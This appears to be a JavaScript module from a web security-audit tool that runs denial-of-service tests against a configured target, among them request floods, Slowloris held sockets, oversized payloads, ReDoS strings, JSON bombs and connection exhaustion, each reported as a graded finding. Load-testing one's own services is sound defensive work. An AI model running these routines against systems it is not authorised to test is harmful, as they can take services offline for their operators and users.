/**
 * ╔══════════════════════════════════════════════════════════════════════════════╗
 * ║                    MODULE 12 - DOS & STRESS TESTS                            ║
 * ║                         AGGRESSIVE SECURITY AUDIT                            ║
 * ╚══════════════════════════════════════════════════════════════════════════════╝
 * 
 * ⚠️  WARNING: These tests can cause service disruption!
 *     Only run with explicit permission and in test environments.
 * 
 * Tests include:
 * - Application Layer DoS
 * - Resource Exhaustion
 * - Slowloris Attacks
 * - RegEx DoS (ReDoS)
 * - XML Bomb / Billion Laughs
 * - Hash Collision Attacks
 * - Large Payload Attacks
 * - Connection Pool Exhaustion
 */

import axios from 'axios';
import https from 'https';
import http from 'http';
import net from 'net';

export class DoSStressModule {
  constructor(config) {
    this.config = config;
    this.findings = [];
    this.maxConcurrent = config.scope?.testDoS?.maxConcurrent || 100;
    this.duration = config.scope?.testDoS?.duration || 30; // seconds
    this.axiosInstance = axios.create({ 
      timeout: 30000, 
      validateStatus: () => true,
      httpsAgent: new https.Agent({ 
        rejectUnauthorized: false,
        maxSockets: 1000
      }),
      httpAgent: new http.Agent({
        maxSockets: 1000
      })
    });
  }

  async runStressTest() {
    console.log('\n  ╔══════════════════════════════════════════════════════════════╗');
    console.log('  ║           [12] DOS & STRESS TESTS                            ║');
    console.log('  ╠══════════════════════════════════════════════════════════════╣');
    console.log('  ║  ⚠️  WARNING: These tests may cause service disruption!      ║');
    console.log('  ╚══════════════════════════════════════════════════════════════╝\n');

    if (!this.config.scope?.testDoS?.enabled) {
      console.log('    ⏭️  DoS tests SKIPPED (disabled in configuration)');
      console.log('    To enable: set config.scope.testDoS.enabled = true\n');
      return { 
        findings: [{
          severity: 'INFO',
          category: 'DoS Testing',
          title: 'DoS Tests Skipped',
          description: 'DoS and stress tests were not run. Enable in config to test.',
          remediation: 'Run DoS tests in a controlled environment.',
          cvss: 0,
          cwe: 'N/A'
        }]
      };
    }

    const allFindings = [];

    try {
      // 1. Baseline Performance
      const baseline = await this.measureBaseline();
      console.log(`    Baseline response time: ${baseline}ms`);

      // 2. Application Layer Flood
      const floodFindings = await this.testApplicationFlood(baseline);
      allFindings.push(...floodFindings);

      // 3. Slowloris Attack
      const slowlorisFindings = await this.testSlowloris();
      allFindings.push(...slowlorisFindings);

      // 4. Large Payload Attack
      const payloadFindings = await this.testLargePayload();
      allFindings.push(...payloadFindings);

      // 5. ReDoS (Regular Expression DoS)
      const redosFindings = await this.testReDoS();
      allFindings.push(...redosFindings);

      // 6. Resource Exhaustion
      const resourceFindings = await this.testResourceExhaustion();
      allFindings.push(...resourceFindings);

      // 7. Connection Pool Exhaustion
      const connectionFindings = await this.testConnectionExhaustion();
      allFindings.push(...connectionFindings);

      // 8. XML/JSON Bomb
      const bombFindings = await this.testDataBomb();
      allFindings.push(...bombFindings);

      // 9. Hash Collision (HashDoS)
      const hashFindings = await this.testHashCollision();
      allFindings.push(...hashFindings);

      // 10. Verify Recovery
      await this.verifyRecovery(baseline);

      console.log(`    ✓ DoS/Stress tests completed: ${allFindings.length} findings`);

    } catch (error) {
      console.log(`    ✗ DoS test error: ${error.message}`);
    }

    return { findings: allFindings };
  }

  async measureBaseline() {
    console.log('    → Measuring baseline performance...');
    const times = [];

    for (let i = 0; i < 5; i++) {
      const start = Date.now();
      try {
        await this.axiosInstance.get(this.config.target);
        times.push(Date.now() - start);
      } catch (e) {
        times.push(30000); // Timeout
      }
    }

    return Math.round(times.reduce((a, b) => a + b) / times.length);
  }

  async testApplicationFlood(baseline) {
    const findings = [];
    console.log(`    → Testing application layer flood (${this.maxConcurrent} concurrent)...`);

    const endpoints = [
      this.config.target,
      `${this.config.target}/api/etablissements`,
      `${this.config.target}/api/search?q=test`
    ];

    for (const endpoint of endpoints) {
      console.log(`      Testing: ${endpoint}`);

      const results = {
        success: 0,
        errors: 0,
        totalTime: 0,
        minTime: Infinity,
        maxTime: 0
      };

      const startTime = Date.now();
      const promises = [];

      for (let i = 0; i < this.maxConcurrent; i++) {
        promises.push(
          (async () => {
            const reqStart = Date.now();
            try {
              const response = await this.axiosInstance.get(endpoint, { timeout: 10000 });
              const reqTime = Date.now() - reqStart;
              results.success++;
              results.totalTime += reqTime;
              results.minTime = Math.min(results.minTime, reqTime);
              results.maxTime = Math.max(results.maxTime, reqTime);
              return response.status;
            } catch (e) {
              results.errors++;
              return null;
            }
          })()
        );
      }

      await Promise.allSettled(promises);
      const duration = Date.now() - startTime;
      const avgTime = results.success > 0 ? Math.round(results.totalTime / results.success) : 0;

      console.log(`        Results: ${results.success} success, ${results.errors} errors, avg ${avgTime}ms`);

      // Check for vulnerability indicators
      if (results.errors > this.maxConcurrent * 0.1) {
        // More than 10% errors under load
        findings.push({
          severity: 'MEDIUM',
          category: 'DoS Resistance',
          title: `Application Unstable Under Load: ${endpoint}`,
          description: `${results.errors}/${this.maxConcurrent} requests failed under concurrent load.`,
          remediation: 'Implement proper connection pooling, load balancing, and rate limiting.',
          cvss: 5.3,
          cwe: 'CWE-400'
        });
      }

      if (avgTime > baseline * 10) {
        // Response time increased 10x
        findings.push({
          severity: 'HIGH',
          category: 'DoS Resistance',
          title: `Severe Performance Degradation: ${endpoint}`,
          description: `Response time increased from ${baseline}ms to ${avgTime}ms under load (${Math.round(avgTime/baseline)}x slower).`,
          remediation: 'Optimize database queries, implement caching, and horizontal scaling.',
          cvss: 7.5,
          cwe: 'CWE-400'
        });
      }

      if (results.success === 0) {
        findings.push({
          severity: 'CRITICAL',
          category: 'DoS Resistance',
          title: `Complete Service Denial: ${endpoint}`,
          description: 'Service became completely unavailable under load testing.',
          remediation: 'Implement rate limiting, WAF, and auto-scaling.',
          cvss: 7.5,
          cwe: 'CWE-400'
        });
      }

      // Wait for recovery
      await this.sleep(2000);
    }

    return findings;
  }

  async testSlowloris() {
    const findings = [];
    console.log('    → Testing Slowloris attack resistance...');

    const targetUrl = new URL(this.config.target);
    const connections = [];
    const maxSlowConnections = 50;

    try {
      for (let i = 0; i < maxSlowConnections; i++) {
        const socket = new net.Socket();
        
        socket.connect(targetUrl.port || 80, targetUrl.hostname, () => {
          // Send partial HTTP request
          socket.write(`GET / HTTP/1.1\r\nHost: ${targetUrl.hostname}\r\n`);
        });

        socket.on('error', () => {});
        connections.push(socket);
      }

      console.log(`      Opened ${connections.length} slow connections`);

      // Wait for connections to be held
      await this.sleep(5000);

      // Try normal request while slow connections are open
      const start = Date.now();
      try {
        const response = await axios.get(this.config.target, { timeout: 10000 });
        const responseTime = Date.now() - start;

        if (response.status === 200) {
          console.log(`      Service still responding (${responseTime}ms)`);
        }
      } catch (e) {
        findings.push({
          severity: 'HIGH',
          category: 'DoS Resistance',
          title: 'Vulnerable to Slowloris Attack',
          description: 'Service became unavailable with slow HTTP connections.',
          remediation: 'Implement connection timeouts, use reverse proxy with Slowloris protection.',
          cvss: 7.5,
          cwe: 'CWE-400'
        });
      }

    } finally {
      // Cleanup connections
      for (const socket of connections) {
        try { socket.destroy(); } catch (e) {}
      }
    }

    return findings;
  }

  async testLargePayload() {
    const findings = [];
    console.log('    → Testing large payload handling...');

    const payloadSizes = [
      { size: 1024 * 1024, name: '1MB' },        // 1MB
      { size: 10 * 1024 * 1024, name: '10MB' },  // 10MB
      { size: 50 * 1024 * 1024, name: '50MB' }   // 50MB
    ];

    const endpoints = [
      { path: '/api/reclamations', method: 'POST' },
      { path: '/api/upload', method: 'POST' },
      { path: '/api/auth/register', method: 'POST' }
    ];

    for (const endpoint of endpoints) {
      for (const payload of payloadSizes) {
        try {
          const largeData = {
            description: 'A'.repeat(payload.size),
            data: Buffer.alloc(payload.size).toString('base64')
          };

          const response = await this.axiosInstance.post(
            `${this.config.target}${endpoint.path}`,
            largeData,
            { 
              headers: { 'Content-Type': 'application/json' },
              timeout: 30000,
              maxContentLength: Infinity,
              maxBodyLength: Infinity
            }
          );

          if (response.status !== 413 && response.status !== 400) {
            findings.push({
              severity: 'MEDIUM',
              category: 'DoS Resistance',
              title: `Large Payload Accepted: ${endpoint.path}`,
              description: `Endpoint accepts ${payload.name} payload without proper size limits.`,
              remediation: 'Implement request body size limits (e.g., 1MB max).',
              cvss: 5.3,
              cwe: 'CWE-400'
            });
            break;
          }
        } catch (e) {
          // Expected for large payloads
        }
      }
    }

    return findings;
  }

  async testReDoS() {
    const findings = [];
    console.log('    → Testing ReDoS vulnerabilities...');

    // Evil regex patterns that can cause catastrophic backtracking
    const redosPayloads = [
      // Email validation bypass
      { field: 'email', value: 'a@' + 'a'.repeat(50) + '!' },
      // Repeated groups
      { field: 'description', value: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!' },
      // Nested quantifiers
      { field: 'search', value: '((((((((((a))))))))))'.repeat(20) },
      // Classic ReDoS
      { field: 'input', value: 'a'.repeat(30) + 'X' }
    ];

    const searchEndpoint = `${this.config.target}/api/search`;

    for (const payload of redosPayloads) {
      const start = Date.now();
      try {
        await this.axiosInstance.get(
          `${searchEndpoint}?q=${encodeURIComponent(payload.value)}`,
          { timeout: 5000 }
        );
      } catch (e) {}
      const duration = Date.now() - start;

      if (duration > 3000) {
        findings.push({
          severity: 'HIGH',
          category: 'DoS Resistance',
          title: 'ReDoS Vulnerability Detected',
          description: `Request took ${duration}ms with pattern "${payload.value.substring(0, 30)}..."`,
          remediation: 'Review and optimize regex patterns. Use non-backtracking regex or timeouts.',
          cvss: 7.5,
          cwe: 'CWE-1333'
        });
        break;
      }
    }

    return findings;
  }

  async testResourceExhaustion() {
    const findings = [];
    console.log('    → Testing resource exhaustion...');

    // Test file descriptor exhaustion via repeated API calls
    const maxRequests = 500;
    const promises = [];

    for (let i = 0; i < maxRequests; i++) {
      promises.push(
        this.axiosInstance.get(`${this.config.target}/api/etablissements?page=${i}`)
          .catch(() => null)
      );
    }

    const results = await Promise.allSettled(promises);
    const failures = results.filter(r => r.status === 'rejected' || r.value === null).length;

    if (failures > maxRequests * 0.5) {
      findings.push({
        severity: 'MEDIUM',
        category: 'DoS Resistance',
        title: 'Resource Exhaustion Under Rapid Requests',
        description: `${failures}/${maxRequests} requests failed, indicating resource limits.`,
        remediation: 'Increase file descriptor limits, implement request queuing.',
        cvss: 5.3,
        cwe: 'CWE-400'
      });
    }

    return findings;
  }

  async testConnectionExhaustion() {
    const findings = [];
    console.log('    → Testing connection pool exhaustion...');

    // Create many concurrent connections to database-heavy endpoints
    const dbEndpoints = [
      '/api/etablissements?limit=1000',
      '/api/evenements?all=true',
      '/api/reclamations?all=true'
    ];

    const concurrentRequests = 200;
    const promises = [];

    for (let i = 0; i < concurrentRequests; i++) {
      const endpoint = dbEndpoints[i % dbEndpoints.length];
      promises.push(
        this.axiosInstance.get(`${this.config.target}${endpoint}`)
          .then(res => ({ status: res.status, time: Date.now() }))
          .catch(e => ({ error: e.message, time: Date.now() }))
      );
    }

    const start = Date.now();
    const results = await Promise.allSettled(promises);
    const duration = Date.now() - start;

    const errors = results.filter(r => r.value?.error).length;
    const timeouts = results.filter(r => r.value?.error?.includes('timeout')).length;
    const connectionErrors = results.filter(r => 
      r.value?.error?.includes('ECONNREFUSED') || 
      r.value?.error?.includes('ETIMEDOUT')
    ).length;

    if (connectionErrors > concurrentRequests * 0.2) {
      findings.push({
        severity: 'HIGH',
        category: 'DoS Resistance',
        title: 'Connection Pool Exhaustion',
        description: `${connectionErrors}/${concurrentRequests} connection errors under load.`,
        remediation: 'Increase connection pool size, implement connection recycling.',
        cvss: 7.5,
        cwe: 'CWE-400'
      });
    }

    console.log(`      Completed in ${duration}ms (${errors} errors, ${timeouts} timeouts)`);

    return findings;
  }

  async testDataBomb() {
    const findings = [];
    console.log('    → Testing JSON bomb handling...');

    // Create deeply nested JSON
    const createNestedObject = (depth) => {
      if (depth === 0) return 'value';
      return { nested: createNestedObject(depth - 1) };
    };

    const jsonBombs = [
      { name: 'deep nesting', data: createNestedObject(100) },
      { name: 'wide object', data: Object.fromEntries(
        Array.from({ length: 1000 }, (_, i) => [`key${i}`, `value${i}`])
      )},
      { name: 'array bomb', data: { items: Array(10000).fill({ data: 'x'.repeat(100) }) }}
    ];

    for (const bomb of jsonBombs) {
      try {
        const start = Date.now();
        const response = await this.axiosInstance.post(
          `${this.config.target}/api/reclamations`,
          bomb.data,
          { 
            headers: { 'Content-Type': 'application/json' },
            timeout: 10000
          }
        );
        const duration = Date.now() - start;

        if (response.status !== 400 && response.status !== 413 && duration > 5000) {
          findings.push({
            severity: 'MEDIUM',
            category: 'DoS Resistance',
            title: `JSON Bomb Processed: ${bomb.name}`,
            description: `Server spent ${duration}ms processing ${bomb.name} payload.`,
            remediation: 'Implement JSON parsing limits (max depth, max keys, max array size).',
            cvss: 5.3,
            cwe: 'CWE-400'
          });
        }
      } catch (e) {
        // Expected for bombs
      }
    }

    return findings;
  }

  async testHashCollision() {
    const findings = [];
    console.log('    → Testing hash collision resistance...');

    // Generate keys that may cause hash collisions in V8
    // This is a simplified test - real hash collision attacks are complex
    const collisionPayload = {};
    const collisionKeys = [];

    // Generate potentially colliding keys
    for (let i = 0; i < 1000; i++) {
      const key = 'x'.repeat(i % 50) + i;
      collisionKeys.push(key);
      collisionPayload[key] = i;
    }

    try {
      const start = Date.now();
      const response = await this.axiosInstance.post(
        `${this.config.target}/api/search`,
        collisionPayload,
        { 
          headers: { 'Content-Type': 'application/json' },
          timeout: 10000
        }
      );
      const duration = Date.now() - start;

      if (duration > 3000) {
        findings.push({
          severity: 'MEDIUM',
          category: 'DoS Resistance',
          title: 'Potential Hash Collision Vulnerability',
          description: `Request with 1000 keys took ${duration}ms (may indicate hash collision attack vector).`,
          remediation: 'Limit number of JSON keys, use randomized hash seeds.',
          cvss: 5.3,
          cwe: 'CWE-407'
        });
      }
    } catch (e) {
      // Expected
    }

    return findings;
  }

  async verifyRecovery(baseline) {
    console.log('    → Verifying service recovery...');
    
    await this.sleep(5000);

    const times = [];
    for (let i = 0; i < 5; i++) {
      const start = Date.now();
      try {
        await this.axiosInstance.get(this.config.target);
        times.push(Date.now() - start);
      } catch (e) {
        times.push(30000);
      }
    }

    const avgRecovery = Math.round(times.reduce((a, b) => a + b) / times.length);
    const recovered = avgRecovery < baseline * 2;

    console.log(`      Recovery time: ${avgRecovery}ms (baseline: ${baseline}ms)`);
    console.log(`      ${recovered ? '✓ Service recovered' : '✗ Service still degraded'}`);

    return recovered;
  }

  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}
